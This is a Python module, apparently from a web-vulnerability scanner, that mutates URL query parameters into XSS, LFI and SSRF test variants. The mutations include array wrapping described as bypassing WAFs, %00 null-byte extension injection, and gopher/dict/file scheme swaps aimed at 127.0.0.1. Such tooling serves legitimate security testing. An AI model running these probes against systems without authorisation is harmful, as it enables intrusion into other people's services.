from urllib.parse import urlparse, parse_qs, urlunparse, urlencode
import copy

class MutationEngine:
    """
    Core engine for generating high-value attack variants from base seeds.
    Implements RedOps2-style aggressive parameter and structure mutations.
    """
    def __init__(self, budget_manager=None):
        self.budget = budget_manager
        
    def generate_variants(self, seed_url, attack_type="generic"):
        """
        Generates variants for a specific attack type.
        Supported types: xss, lfi, ssrf, sqli, openredirect
        """
        variants = []
        parsed = urlparse(seed_url)
        query = parse_qs(parsed.query)
        
        if not query:
            # If no query, we can't mutate much unless we inject common params
            # But the SeedFactory should have already injected them.
            return [{"url": seed_url, "mutations": ["original"]}]

        if attack_type == "xss":
            variants.extend(self._mutate_xss(parsed, query))
        elif attack_type == "lfi":
            variants.extend(self._mutate_lfi(parsed, query))
        elif attack_type == "ssrf":
            variants.extend(self._mutate_ssrf(parsed, query))
        else:
            # Generic/Default
            variants.append({"url": seed_url, "mutations": ["original"]})
            
        return variants

    def _mutate_xss(self, parsed, query):
        results = []
        # Mutation 1: Array-style params (bypass some WAFs)
        # e.g. p=1 -> p[]=1
        for param in query:
            if not self.budget or self.budget.can_add_variant():
                new_query = copy.deepcopy(query)
                val = new_query.pop(param)
                new_query[f"{param}[]"] = val
                results.append(self._build_variant(parsed, new_query, [f"array_wrap:{param}"]))
                if self.budget: self.budget.track_variant()

        # Mutation 2: Empty/Null probes
        for param in query:
            if not self.budget or self.budget.can_add_variant():
                new_query = copy.deepcopy(query)
                new_query[param] = [""]
                results.append(self._build_variant(parsed, new_query, [f"null_probe:{param}"]))
                if self.budget: self.budget.track_variant()
                
        # Mutation 3: Simple probe injection
        # (Dalfox handles the payload, we just provide the structure)
        results.append({"url": urlunparse(parsed), "mutations": ["original"]})
        
        return results

    def _mutate_lfi(self, parsed, query):
        results = []
        # LFI keywords to target
        lfi_keywords = ["file", "path", "page", "template", "include", "doc", "view"]
        
        for param in query:
            is_lfi_target = any(kw in param.lower() for kw in lfi_keywords)
            if is_lfi_target:
                # Mutation 1: Extension injection (.php, .txt)
                for ext in [".php", ".html", "%00"]:
                    if not self.budget or self.budget.can_add_variant():
                        new_query = copy.deepcopy(query)
                        new_query[param] = [f"{new_query[param][0]}{ext}"]
                        results.append(self._build_variant(parsed, new_query, [f"lfi_ext:{ext}"]))
                        if self.budget: self.budget.track_variant()
        
        if not results:
            results.append({"url": urlunparse(parsed), "mutations": ["original"]})
        return results

    def _mutate_ssrf(self, parsed, query):
        results = []
        ssrf_keywords = ["url", "uri", "dest", "domain", "host", "callback", "path"]
        
        for param in query:
            if any(kw in param.lower() for kw in ssrf_keywords):
                # Mutation 1: Scheme swap (if it looks like a URL)
                val = query[param][0]
                if "://" in val:
                    for scheme in ["http", "https", "gopher", "dict", "file"]:
                        if not self.budget or self.budget.can_add_variant():
                            new_query = copy.deepcopy(query)
                            new_query[param] = [f"{scheme}://127.0.0.1"]
                            results.append(self._build_variant(parsed, new_query, [f"ssrf_scheme:{scheme}"]))
                            if self.budget: self.budget.track_variant()
                            
        if not results:
            results.append({"url": urlunparse(parsed), "mutations": ["original"]})
        return results

    def _build_variant(self, parsed, query_dict, mutation_list):
        new_query_str = urlencode(query_dict, doseq=True)
        new_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query_str, parsed.fragment))
        return {"url": new_url, "mutations": mutation_list}
